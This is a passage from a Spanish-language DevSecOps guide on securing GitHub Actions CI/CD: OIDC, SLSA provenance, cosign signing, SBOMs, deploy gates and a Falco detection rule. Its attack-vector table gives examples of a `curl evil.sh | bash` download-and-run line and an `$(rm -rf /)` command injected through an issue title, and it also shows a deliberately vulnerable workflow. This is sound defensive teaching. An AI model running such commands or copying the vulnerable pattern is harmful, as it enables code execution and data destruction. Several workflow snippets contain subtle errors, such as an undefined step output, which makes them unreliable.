    permissions:
      contents: read
      security-events: write   # Upload SARIF to Security tab
      # NO id-token (no necesita AWS)
  
  test:
    permissions:
      contents: read
      checks: write            # Test reporter annotations
      pull-requests: write     # PR comments
  
  build:
    permissions:
      contents: read
      packages: write          # Push to ghcr.io / npm
      id-token: write          # OIDC para Sigstore/cosign
      attestations: write      # SLSA provenance
  
  deploy:
    permissions:
      contents: read
      id-token: write          # OIDC AWS
      deployments: write       # Deployment status
```

#### 16.1.3 Ephemeral Runners (GitHub Hosted vs Self-Hosted)

| Aspecto | GitHub-Hosted (ubuntu-latest) | Self-Hosted (Ephemeral) |
|---------|-------------------------------|-------------------------|
| **Isolation** | Nueva VM por job (microVM) | Container/VM efímero por job |
| **Persistence** | Cero (limpio cada run) | Cero si ephemeral + clean |
| **Secrets Access** | Solo jobs con permissions | Configurado por admin |
| **Cost** | Incluido en plan GitHub | Infraestructura propia |
| **Customization** | Limitado (pre-installed tools) | Total (cualquier tool, cache) |
| **Security** | **Recomendado** para mayoría | Solo si necesidades específicas (GPU, ARM, private network) |

**Project One**: **GitHub-Hosted** para todos los jobs. Self-hosted solo si future: GPU tests, ARM builds, private VPC access.

```yaml
# Ejemplo self-hosted ephemeral (actions-runner-controller en Kubernetes)
# .github/workflows/ci.yml
jobs:
  test-arm:
    runs-on: [self-hosted, linux, arm64, ephemeral]  # Requiere ARC
    steps:
      - uses: actions/checkout@v5
      - name: Run tests
        run: npm test
```

#### 16.1.4 No Long-Lived Secrets en Pipeline

| Secreto | Antes (❌) | Ahora (✅) |
|---------|------------|------------|
| AWS Access Keys | `AWS_ACCESS_KEY_ID` en GitHub Secrets | **OIDC Federation** (aws-actions/configure-aws-credentials) |
| Docker Hub / GHCR Token | `DOCKER_PASSWORD` en Secrets | **OIDC + ghcr.io** (GITHUB_TOKEN con packages:write) |
| npm Token | `NPM_TOKEN` en Secrets | **OIDC + npm provenance** (npm publish --provenance) |
| Slack/Discord Webhook | Webhook URL en Secrets | **GitHub App** con permisos scoped |
| SonarQube Token | `SONAR_TOKEN` en Secrets | **OIDC** (si soportado) o GitHub App |

### 16.2 Supply Chain SLSA L1-L3 + Sigstore

#### 16.2.1 Niveles SLSA Build Track v1.0

| Nivel | Requisitos | Project One Estado | Evidencia |
|-------|------------|-------------------|-----------|
| **L1** | Provenance exists (build script, artifacts, dependencies) | ✅ | `slsa-github-generator` genera `intoto.jsonl` |
| **L2** | L1 + Tamper-resistant build service (GitHub Actions), authenticated provenance | ✅ | GitHub Actions + OIDC signing |
| **L3** | L2 + Hardened build (hermetic, reproducible), non-falsifiable provenance | 🎯 Target | Reproducible builds, pinned digests, SLSA L3 builder |

#### 16.2.2 SLSA Provenance Generation (slsa-github-generator)

```yaml
# .github/workflows/slsa-provenance.yml
name: SLSA Provenance
on:
  workflow_call:
    inputs:
      artifacts:
        description: 'Artifact paths to attest'
        required: true
        type: string
      builder-id:
        description: 'SLSA Builder ID'
        required: false
        type: string
        default: 'https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@refs/tags/v2.0.0'
    secrets:
      COSIGN_PASSWORD: required: false

jobs:
  generate-provenance:
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2.0.0
    with:
      base64-subjects: ${{ toJson(github.event.inputs.artifacts) }}
      builder-id: ${{ github.event.inputs.builder-id }}
    secrets:
      COSIGN_PASSWORD: ${{ secrets.COSIGN_PASSWORD }}
```

#### 16.2.3 Cosign Keyless Signing (Sigstore)

```yaml
# .github/workflows/sign-release.yml
name: Sign Release Artifacts
on:
  release:
    types: [published]

permissions:
  contents: read
  id-token: write      # Para cosign keyless
  attestations: write  # Para SLSA provenance
  packages: write      # Para ghcr.io

jobs:
  sign-container:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      
      - name: Login to ghcr.io
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      
      - name: Pull image
        run: docker pull ghcr.io/${{ github.repository }}/server:${{ github.event.release.tag_name }}
      
      - name: Sign with cosign (keyless)
        uses: sigstore/cosign-installer@v3
        with:
          cosign-release: 'v2.2.0'
      
      - name: Sign and push signature
        env:
          COSIGN_EXPERIMENTAL: '1'
        run: |
          cosign sign --yes \
            --registry-username ${{ github.actor }} \
            --registry-password ${{ secrets.GITHUB_TOKEN }} \
            ghcr.io/${{ github.repository }}/server:${{ github.event.release.tag_name }}
      
      - name: Verify signature
        run: |
          cosign verify \
            --certificate-identity-regexp "https://github.com/${{ github.repository }}/.github/workflows/.*" \
            --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
            ghcr.io/${{ github.repository }}/server:${{ github.event.release.tag_name }}

  sign-sbom:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      
      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          format: cyclonedx-json
          output-file: sbom.json
      
      - name: Sign SBOM with cosign
        uses: sigstore/cosign-installer@v3
        run: |
          cosign sign-blob --yes \
            --output-signature sbom.json.sig \
            --output-certificate sbom.json.crt \
            sbom.json
      
      - name: Upload signed SBOM
        uses: actions/upload-artifact@v4
        with:
          name: signed-sbom
          path: |
            sbom.json
            sbom.json.sig
            sbom.json.crt
```

#### 16.2.4 SLSA Verifier + GitHub Attestation Verify

```bash
# Verificar SLSA provenance localmente
slsa-verifier verify-artifact \
  ghcr.io/myorg/project-one/server:v1.2.3 \
  --source-uri github.com/myorg/project-one \
  --source-tag v1.2.3 \
  --builder-id "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@refs/tags/v2.0.0"

# Verificar attestation GitHub
gh attestation verify ghcr.io/myorg/project-one/server:v1.2.3 \
  --repo myorg/project-one \
  --signer-workflow "sign-release.yml"
```

#### 16.2.5 Kyverno / Sigstore Policy Controller (Admission Control)

```yaml
# k8s/policies/verify-slsa.yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-slsa-provenance
spec:
  validationFailureAction: Enforce
  background: false
  rules:
  - name: require-slsa-l3-provenance
    match:
      any:
      - resources:
          kinds:
          - Pod
    verifyImages:
    - image: "ghcr.io/myorg/project-one/*"
      key: |
        -----BEGIN PUBLIC KEY-----
        MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
        -----END PUBLIC KEY-----
      attestations:
      - predicateType: "https://slsa.dev/provenance/v1"
        conditions:
        - all:
          - key: "{{ predicate.buildConfig.builder.id }}"
            operator: Equals
            value: "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@refs/tags/v2.0.0"
          - key: "{{ predicate.buildConfig.resolvedDependencies[*].uri }}"
            operator: Contains
            value: "github.com/myorg/project-one"
```

### 16.3 Artifact Signing

| Artifact | Método | Verificación |
|----------|--------|--------------|
| **Container Images** | cosign keyless (OIDC) | `cosign verify --certificate-identity-regexp ...` |
| **npm Packages** | `npm publish --provenance` (built-in) | `npm audit signatures` / `sigstore verify` |
| **SBOMs** | cosign sign-blob | `cosign verify-blob` |
| **Binaries/CLI** | cosign sign-blob | `cosign verify-blob` |
| **Helm Charts** | cosign sign-blob + helm-prov | `helm verify` |

**Docker Content Trust (DCT) / Notary v2**:
```bash
# Habilitar DCT (legacy, migrar a cosign)
export DOCKER_CONTENT_TRUST=1
docker push myorg/project-one:tag  # Firma automática con clave local

# Verificar
docker trust inspect --pretty myorg/project-one:tag
```

> **Recomendación**: Usar **cosign keyless** (Sigstore) en lugar de DCT/Notary. Sin gestión de claves, identidad OIDC, transparency log (Rekor).

### 16.4 Dependency Pinning

```json
// package.json - Versiones exactas (no ranges)
{
  "dependencies": {
    "express": "4.19.2",
    "jsonwebtoken": "9.0.2",
    "prisma": "5.12.0",
    "@prisma/client": "5.12.0",
    "zod": "3.22.4"
  },
  "devDependencies": {
    "vitest": "1.5.0",
    "eslint": "8.57.0",
    "prettier": "3.2.5"
  }
}
```

**Lockfile Integrity**:
```bash
# npm ci usa package-lock.json exacto
npm ci --ignore-scripts --audit-level=high

# Verificar integridad lockfile
npm install --package-lock-only --dry-run 2>&1 | grep -E "(added|removed|changed)" || echo "Lockfile stable"
```

**Dependabot Configuration** (`.github/dependabot.yml`):
```yaml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "09:00"
      timezone: "America/Mexico_City"
    open-pull-requests-limit: 10
    labels:
      - "dependencies"
      - "automated"
    groups:
      development-dependencies:
        patterns:
          - "eslint*"
          - "prettier*"
          - "typescript*"
          - "vitest*"
          - "@types/*"
        update-types:
          - "minor"
          - "patch"
      production-dependencies:
        patterns:
          - "*"
        exclude-patterns:
          - "eslint*"
          - "prettier*"
          - "typescript*"
          - "vitest*"
          - "@types/*"
        update-types:
          - "patch"
    ignore:
      - dependency-name: "react"
        update-types: ["version-update:semver-major"]
      - dependency-name: "next"
        update-types: ["version-update:semver-major"]

  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
    labels:
      - "github-actions"
      - "automated"
```

### 16.5 Runner Security

| Medida | Implementación |
|--------|----------------|
| **GitHub-Hosted Runners** | Usar `ubuntu-latest` (microVM fresco cada job) |
| **No Self-Hosted Persistentes** | Evitar runners persistentes (contaminación, secret leakage) |
| **Ephemeral Self-Hosted** | Si necesario: `actions-runner-controller` en K8s con pods efímeros por job |
| **Hardening Runner** | Clean checkout, sin secrets en `env` globales, `actions/checkout` con persist-credentials: false, pinning de actions a SHA |

> **Regla Project One**: GitHub-Hosted runners para el 100% de los jobs. Prohibido runners persistentes self-hosted (riesgo de contaminación y fuga de secrets). Si se requiere self-hosted, usar ARC con pods efímeros + GitHub Environments para restringir acceso a secrets.

### 16.6 GitHub Environments (Gates de Deploy)

GitHub Environments añaden **capas de protección** sobre secrets y deploys. Cada entorno tiene su propio conjunto de secrets, reglas de protección y visibilidad.

| Entorno | Required Reviewers | Deployment Branches | Wait Timer | Secrets Scoped | Uso Project One |
|---------|-------------------|---------------------|-----------|----------------|-----------------|
| **development** | — | `develop` | — | `DEV_*` | CI/CD interno, sin aprobación |
| **preview** | — | `feature/*` | — | `PREVIEW_*` | PRs con entorno efímero |
| **staging** | 1 reviewer (Tech Lead) | `main` | 0 min | `STAGING_*` | Pre-producción, deploy automático tras merge |
| **production** | 2 reviewers (Tech Lead + Security) | `main` + tag `v*` | 15 min wait | `PROD_*` | Producción, aprobación manual obligatoria |

```yaml
# .github/workflows/cd.yml - Uso de environments con protection gates
name: CD
on:
  push:
    branches: [main]
    tags: ['v*']

jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment: staging   # Secrets de staging + 1 reviewer
    permissions:
      contents: read
      id-token: write      # OIDC AWS
    steps:
      - uses: actions/checkout@v5
      - name: Deploy ECS (staging)
        run: aws ecs update-service --cluster project-one-staging --service api --force-new-deployment

  deploy-production:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://api.project-one.com
    needs: [deploy-staging]
    # Los protection rules del entorno production bloquean el job
    # hasta que 2 reviewers aprueben + wait timer 15 min expire.
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@v5
      - name: Deploy ECS (production) - Blue/Green
        run: aws ecs deploy --cluster project-one-prod --service api --codedeploy-appspec appspec.yml
```

**Jerarquía de Secrets**: `Repository secrets` < `Environment secrets` < `Organization secrets`. Las environment secrets solo se inyectan en jobs con ese `environment:` — un atacante que comprometa un PR **no puede** acceder a secrets de producción si el job no las declara.

**Cross-ref**: ver `../cicd-plan-implementacion.md` sección 6 para los 4 entornos definidos (Local, Preview, Staging, Prod).

### 16.7 Pipeline Attack Vectors (Cómo te Atacan el CI/CD)

Los pipelines son un **objetivo de alto valor**: dan acceso a secrets, producción y la cadena de suministro. Estos son los vectores más explotados:

| Vector | Descripción | Ejemplo Vulnerable | Mitigación |
|--------|-------------|--------------------|------------|
| **`pull_request_target` misuse** | Ejecuta código del PR con acceso a secrets del repo base | Workflow con `pull_request_target` que hace checkout del head del PR y ejecuta scripts | Usar `pull_request` normal; si se necesita `pull_request_target`, checkout **solo el código confiable** (main) y validar el head por separado |
| **Self-hosted runner poisoning** | Un PR malicioso se ejecuta en runner con acceso a secrets/infra | PR con `run: curl evil.sh \| bash` en runner self-hosted conectado a la VPC | Runners efímeros, GitHub-hosted, secrets solo en jobs con environment |
| **Action / Issue / PR injection** | Comentario o título de issue/PR inyecta comandos en `run:` | `run: echo "${{ github.event.issue.title }}"` — el título puede contener `$(rm -rf /)` | Pasar inputs vía `env:` (no interpolación directa en shell) |
| **Third-party action compromise** | Una action comprometida (o typosquat) ejecuta código malicioso | `uses: tj-actions/changed-files@v41` comprometida exfiltra secrets (incidente 2025) | Pinning a SHA completo, usar solo actions oficiales/verificadas, revisar el marketplace |
| **Dependency confusion / supply chain** | Paquete malicioso con mismo nombre que dependencia privada | Paquete público `project-one-internal` con código malicioso | Registro privado con scope, `npm --registry`, lockfiles, Dependabot |

```yaml
# Ejemplo VULNERABLE - NO USAR
jobs:
  bad:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - name: Comment
        run: echo "${{ github.event.issue.title }}"   # ❌ Inyección directa

# Ejemplo SEGURO
jobs:
  good:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - name: Comment
        env:
          ISSUE_TITLE: ${{ github.event.issue.title }}  # ✅ Vía env, sin ejecución
        run: echo "$ISSUE_TITLE"
```

### 16.8 SBOM en CI + VEX

**SBOM** (Software Bill of Materials): inventario machine-readable de componentes, versiones y dependencias de un artifact. **Obligatorio** para cumplir con la Orden Ejecutiva US 14028, SLSA, y estándares enterprise.

| Aspecto | CycloneDX 1.6 | SPDX 3.0 |
|---------|---------------|----------|
| **Organización** | OWASP | Linux Foundation |
| **Formato** | JSON/XML | JSON/RDF/YAML |
| **Vulnerabilidades** | ✅ Nacivo (VEX incluido) | ✅ Profile Security |
| **Attestations** | ✅ CDXA (CycloneDX Attestations) | ✅ Profile Build |
| **Extras** | CBOM (crypto BOM), services, pedigree | AI/ML model cards, dataset profiles |
| **Casos de uso** | Seguridad app, VEX, compliance | Licensing, SBOM general, AI |

**VEX** (Vulnerability Exploitability eXchange): declara si una vulnerabilidad conocida en un componente **es explotable en tu contexto**. Evita alertas falsas.

| Estado VEX | Significado |
|------------|-------------|
| `not_affected` | El componente vulnerable no usa la feature vulnerable (no requiere fix) |
| `affected` | La vulnerabilidad aplica — requiere fix |
| `fixed` | Ya corregida en versión posterior |
| `under_investigation` | Análisis en curso |

```yaml
# .github/workflows/sbom.yml - Generación SBOM + VEX en CI
name: SBOM
on:
  push:
    branches: [main]
    tags: ['v*']
  schedule:
    - cron: '0 4 * * 1'  # Semanal

permissions:
  contents: write

jobs:
  generate-sbom:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5

      - name: Generate SBOM (CycloneDX JSON)
        uses: anchore/sbom-action@v0
        with:
          path: .
          format: cyclonedx-json
          output-file: sbom.cyclonedx.json

      - name: Generate SBOM (SPDX)
        uses: anchore/sbom-action@v0
        with:
          path: .
          format: spdx-json
          output-file: sbom.spdx.json

      - name: Upload SBOMs as release artifacts
        uses: actions/upload-artifact@v4
        with:
          name: sboms
          path: sbom.*.json
```

**Caso de uso VEX**: Trivy reporta `CVE-2024-XXXXX` en `axios@1.6.0` que afecta a la feature de `server-sent events`. Si Project One **no usa SSE**, el equipo de seguridad emite un statement VEX `not_affected` con justificación. El pipeline deja de bloquear el deploy, pero el statement queda como evidencia auditable.

### 16.9 DORA Metrics + DevSecOps

Las métricas DORA miden el **rendimiento de entrega** y se integran con seguridad para probar que **seguridad no ralentiza el delivery** (DevSecOps: seguridad como acelerador, no como freno).

| Métrica | Definición | Elite | High | Medium | Low |
|---------|------------|-------|------|--------|-----|
| **Deployment Frequency** | Frecuencia de deploys a producción | ≥ daily | weekly–monthly | monthly–6mo | < 6 months |
| **Lead Time for Changes** | Tiempo commit → producción | < 1 day | 1 day–1 week | 1 week–1 month | > 6 months |
| **MTTR** | Mean Time To Restore (recuperación de fallo) | < 1 hour | < 1 day | < 1 week | > 1 week |
| **Change Failure Rate** | % de cambios que causan fallo en prod | < 15% | 15–45% | 45–60% | > 60% |

**Cómo integrar seguridad**:

| Métrica | Contribución DevSecOps |
|---------|------------------------|
| **Deployment Frequency** | Pipelines seguros (SLSA, cosign, SBOM) que no agregan fricción — deploys frecuentes con gates automáticos |
| **Lead Time** | SAST/SCA en pre-commit y PR (shift-left) reducen rework tardío; aprobación segura de environments sin cuellos de botella |
| **MTTR** | Runbooks de IR listos, rollback automatizado (blue/green), observabilidad (Falco, SIEM) detectan antes |
| **CFR** | Scanning automático en CI atrapa vulnerabilidades antes del merge, reduciendo fallos en prod |

**Cross-ref**: ver KPIs y estado actual en `../cicd-estado-actual.md` sección 12. Objetivo Project One: **High tier** en las 4 métricas con cero regresiones de seguridad.

### 16.10 Pipeline YAML Seguro Completo (Node/Express + React + Prisma + GH Actions + AWS)

Workflow de referencia con **todos** los controles: least-privilege, OIDC, scans, SBOM, signing, SLSA, environments con gates.

```yaml
# .github/workflows/ci-cd.yml
name: CI/CD Seguro
on:
  pull_request:
    branches: [main, develop]
  push:
    branches: [main, develop]
    tags: ['v*']

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

# Permisos base: mínimo posible. Cada job los amplía solo si lo necesita.
permissions:
  contents: read

jobs:
  # ============================================================
  # 1. CHANGES - Detección de cambios por área (optimización)
  # ============================================================
  changes:
    runs-on: ubuntu-latest
    outputs:
      server: ${{ steps.filter.outputs.server }}
      client: ${{ steps.filter.outputs.client }}
    steps:
      - uses: actions/checkout@v5
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            server:
              - 'apps/server/**'
            client:
              - 'apps/client/**'

  # ============================================================
  # 2. QUALITY - Lint + Format + Types (sin write permissions)
  # ============================================================
  quality:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - run: npm ci --ignore-scripts
      - run: npm run lint
      - run: npm run format -- --check
      - run: npm run typecheck   # tsc --noEmit

  # ============================================================
  # 3. TESTS - Unit + Integration + E2E
  # ============================================================
  test-unit:
    needs: changes
    runs-on: ubuntu-latest
    strategy:
      matrix:
        app: [client, server]
    if: needs.changes.outputs.server == 'true' || needs.changes.outputs.client == 'true'
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - run: npm ci --ignore-scripts
      - name: Unit tests
        run: npm run test:unit --workspace=apps/${{ matrix.app }}

  test-integration:
    needs: [changes]
    runs-on: ubuntu-latest
    if: needs.changes.outputs.server == 'true'
    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_PASSWORD: test
          POSTGRES_USER: test
          POSTGRES_DB: project_one_test
        ports:
          - 5432:5432
        options: >-
          --health-cmd "pg_isready -U test"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    env:
      DATABASE_URL: postgresql://test:test@localhost:5432/project_one_test
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - run: npm ci --ignore-scripts
      - run: npm run prisma:migrate
      - run: npm run test:integration --workspace=apps/server

  test-e2e:
    needs: [changes]
    runs-on: ubuntu-latest
    if: needs.changes.outputs.client == 'true'
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - uses: actions/cache@v4
        with:
          path: ~/.cache/ms-playwright
          key: playwright-${{ runner.os }}
      - run: npm ci --ignore-scripts
      - run: npx playwright install --with-deps
      - run: npm run test:e2e --workspace=e2e

  # ============================================================
  # 4. SECURITY - SAST + SCA + Secret Scan + Dependency Review
  # ============================================================
  security:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write    # Subir SARIF al Security tab
    steps:
      - uses: actions/checkout@v5

      # --- SCA: Trivy (vulnerabilidades en dependencias + imágenes) ---
      - name: Trivy SCA (repo)
        uses: aquasecurity/trivy-action@0.28.0
        with:
          scan-type: fs
          scan-ref: .
          format: sarif
          output: trivy-results.sarif
          severity: HIGH,CRITICAL

      # --- SAST: CodeQL (GitHub nativo) ---
      - name: Initialize CodeQL
        uses: github/codeql-action/init@v3
        with:
          languages: javascript-typescript
          queries: security-and-quality
      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v3

      # --- SAST: Semgrep (reglas OWASP + custom) ---
      - name: Semgrep
        uses: returntocorp/semgrep-action@v3
        with:
          config: p/owasp-top-ten, p/security-audit
          sarif_file: semgrep.sarif

      # --- Secret scanning: Gitleaks ---
      - name: Gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # --- Dependency Review (GitHub native, PRs) ---
      - name: Dependency Review
        uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: high

      # --- Subir todos los SARIF ---
      - name: Upload SARIF to Security tab
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: .
          category: security

  # ============================================================
  # 5. SBOM - Generación de SBOM (solo merge a main / tags)
  # ============================================================
  sbom:
    if: github.event_name == 'push' && (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/'))
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci --ignore-scripts
      - name: Generate SBOM (CycloneDX + SPDX)
        uses: anchore/sbom-action@v0
        with:
          path: .
          format: cyclonedx-json
          output-file: sbom.cyclonedx.json
      - name: Upload SBOM artifact
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: sbom.cyclonedx.json

  # ============================================================
  # 6. BUILD - Build + Docker image + Push a GHCR + Sign
  # ============================================================
  build:
    needs: [quality, test-unit, test-integration, test-e2e, security]
    if: github.event_name == 'push'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write         # Push a ghcr.io
      id-token: write         # OIDC para cosign keyless
      attestations: write     # SLSA provenance
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - run: npm ci --ignore-scripts
      - run: npm run build

      - name: Build Docker image
        run: docker build -f apps/server/Dockerfile.enterprise -t ghcr.io/${{ github.repository }}/server:${{ github.sha }} .

      - name: Login to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Push image
        run: docker push ghcr.io/${{ github.repository }}/server:${{ github.sha }}

      # --- Sign con cosign keyless (Sigstore) ---
      - name: Install cosign
        uses: sigstore/cosign-installer@v3
        with:
          cosign-release: 'v2.2.0'
      - name: Sign image (keyless)
        run: |
          cosign sign --yes \
            --registry-username ${{ github.actor }} \
            --registry-password ${{ secrets.GITHUB_TOKEN }} \
            ghcr.io/${{ github.repository }}/server:${{ github.sha }}

      # --- Attest SLSA provenance (GitHub native attestations) ---
      - name: Generate artifact attestation
        uses: actions/attest-build-provenance@v1
        with:
          subject-name: ghcr.io/${{ github.repository }}/server
          subject-digest: sha256:${{ steps.digest.outputs.digest }}
          push-to-registry: true

  # ============================================================
  # 7. SLSA PROVENANCE - Provenance L2/L3 (release)
  # ============================================================
  slsa-provenance:
    if: startsWith(github.ref, 'refs/tags/')
    needs: [build]
    permissions:
      actions: read
      id-token: write
      contents: write
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2.0.0
    with:
      base64-subjects: "${{ needs.build.outputs.digests }}"
      upload-assets: true

  # ============================================================
  # 8. DEPLOY STAGING - OIDC AWS + ECS + Smoke test
  # ============================================================
  deploy-staging:
    needs: [build]
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: staging
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@v5

      - name: Configure AWS (OIDC)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_STAGING_ROLE_ARN }}
          aws-region: us-east-1
          role-session-name: ci-staging-${{ github.run_id }}

      - name: Deploy to ECS staging
        run: |
          aws ecs update-service \
            --cluster project-one-staging \
            --service api \
            --force-new-deployment \
            --region us-east-1

      - name: Smoke test
        run: |
          curl -fsS --retry 10 --retry-delay 5 \
            https://staging.project-one.com/health \
            | grep -q '"status":"ok"'

  # ============================================================
  # 9. DEPLOY PRODUCTION - Approval gate + Blue/Green + Rollback
  # ============================================================
  deploy-production:
    needs: [deploy-staging, sbom, slsa-provenance]
    if: startsWith(github.ref, 'refs/tags/')
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://api.project-one.com
    # Bloqueado por protection rules: 2 reviewers + 15 min wait timer
    permissions:
      contents: read
      id-token: write
      deployments: write
    steps:
      - uses: actions/checkout@v5

      - name: Configure AWS (OIDC)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_PROD_ROLE_ARN }}
          aws-region: us-east-1
          role-session-name: ci-prod-${{ github.run_id }}

      - name: Deploy (Blue/Green CodeDeploy)
        run: |
          aws ecs deploy \
            --cluster project-one-prod \
            --service api \
            --codedeploy-appspec appspec.yml \
            --codedeploy-deployment-group project-one-dg \
            --region us-east-1

      - name: Health check post-deploy
        run: |
          curl -fsS --retry 20 --retry-delay 10 \
            https://api.project-one.com/health

      - name: Rollback on failure (circuit breaker)
        if: failure()
        run: |
          aws ecs deploy --previous-deployment \
            --cluster project-one-prod \
            --service api \
            --codedeploy-appspec appspec.yml \
            --region us-east-1
```

> **Notas clave del pipeline**:
> 1. Cada job declara `permissions:` mínimas — un job comprometido no puede escalar.
> 2. `id-token: write` SOLO en jobs que necesitan OIDC (build, deploy). Los demás no lo tienen.
> 3. Secrets de producción viven en el **environment** `production`, no en repo secrets.
> 4. El merge a `main` solo depliega a staging; producción requiere **tag `v*`** + aprobación.
> 5. Trivy falla en HIGH/CRITICAL (bloquea merge) — en producción con VEX se puede excepcionar de forma auditable.

### 16.11 Diagrama Pipeline DevSecOps End-to-End

```mermaid
flowchart TD
    subgraph LOCAL["💻 LOCAL (Developer)"]
        L1[Husky pre-commit\nSemgrep + Gitleaks] --> L2[Commit Conventional]
        L2 --> L3[Push a feature branch]
    end

    subgraph PR["🔀 PULL REQUEST"]
        P1[paths-filter\nserver/client]
        P2[Quality\nlint + format + types]
        P3[Tests\nunit + integration + e2e]
        P4[Security\nTrivy SCA + CodeQL + Semgrep + Gitleaks]
        P5[Dependency Review]
        P1 --> P2
        P1 --> P3
        P1 --> P4 --> P5
        P5 --> P6{¿Scans\nlimpios?}
        P6 -- No --> P7[❌ Merge bloqueado\nfix requerido]
        P6 -- Sí --> P8[✅ Merge a main]
    end

    subgraph CD["🚀 CONTINUOUS DELIVERY (main/tags)"]
        C1[Build\nnpm build + Docker]
        C1 --> C2[SBOM\nCycloneDX + SPDX]
        C2 --> C3[Sign\ncosign keyless + SLSA provenance]
        C3 --> C4[Push GHCR\nghcr.io/org/project-one]
        C4 --> C5[Deploy STAGING\nOIDC AWS + ECS + smoke test]
        C5 --> C6{Approval gate\n2 reviewers + 15min}
        C6 -- Aprobado --> C7[Deploy PROD\nBlue/Green CodeDeploy]
        C7 --> C8{Health check\n/health OK?}
        C8 -- Sí --> C9[🟢 Producción estable]
        C8 -- No --> C10[🔴 Rollback\ndeploy anterior]
        C9 --> C11[Monitoreo\nFalco + SIEM + RUM]
        C11 --> C12{Anomalía?}
        C12 -- Sí --> C13[IR Runbook\nSEV-1/2]
    end

    L3 --> PR
    P8 --> CD

    style L1 fill:#a5f3fc,stroke:#0891b2
    style P4 fill:#fef08a,stroke:#ca8a04
    style P6 fill:#ffe4e6,stroke:#e11d48
    style P8 fill:#bbf7d0,stroke:#16a34a
    style C6 fill:#ffedd5,stroke:#ea580c
---

## 17. Runtime Security & Observabilidad

La seguridad no termina en el deploy. El **runtime** requiere protección activa y observabilidad para detectar ataques que superaron los gates de CI.

### 17.1 RASP (Runtime Application Self-Protection)

| Aspecto | WAF | RASP |
|---------|-----|------|
| **Dónde** | Edge (red) | Dentro de la aplicación (runtime) |
| **Visibilidad** | Tráfico HTTP | Contexto completo (app, data, framework) |
| **Precisión** | Falsos positivos por falta de contexto | Alta precisión (entiende el stack) |
| **Ejemplo** | AWS WAF, CloudFlare | Contrast Security, Datadog ASM, Sqreen |
| **Coste** | Bajo | Mayor (instrumentación) |

**Recomendación enterprise**: usar **ambos** — WAF en edge para protección volumétrica, RASP en runtime para ataques que requieren contexto de la aplicación (SQLi paramétrico, RCE, auth bypass).

### 17.2 eBPF (Extended Berkeley Packet Filter)

Tecnología que ejecuta programas seguros en el kernel sin modificar código del kernel. Permite observabilidad profunda de syscalls, red y procesos.

| Herramienta | Qué hace | Uso |
|-------------|----------|-----|
| **Cilium** | CNI + eBPF para red K8s, Hubble observabilidad | Network policies, service mesh, L7 visibility |
| **Tetragon** | Runtime security con eBPF (Cilium) | Detección de procesos maliciosos, actividades sospechosas |
| **Falco** (CNCF) | Runtime security engine, reglas de syscalls | Alertas en tiempo real (shell en container, escalada) |

```yaml
# Falco - Regla: shell ejecutado dentro de container
# (falco_rules.yaml)
- rule: Terminal shell in container
  desc: Detecta shell interactivo dentro de un container
  condition: >
    spawned_process and container
    and shell_procs and proc.tty exists
    and container_entrypoint
  output: >
    Shell ejecutado en container (user=%user.name
    command=%proc.cmdline container=%container.info)
  priority: WARNING
  tags: [container, shell]
```

### 17.3 SIEM Integration

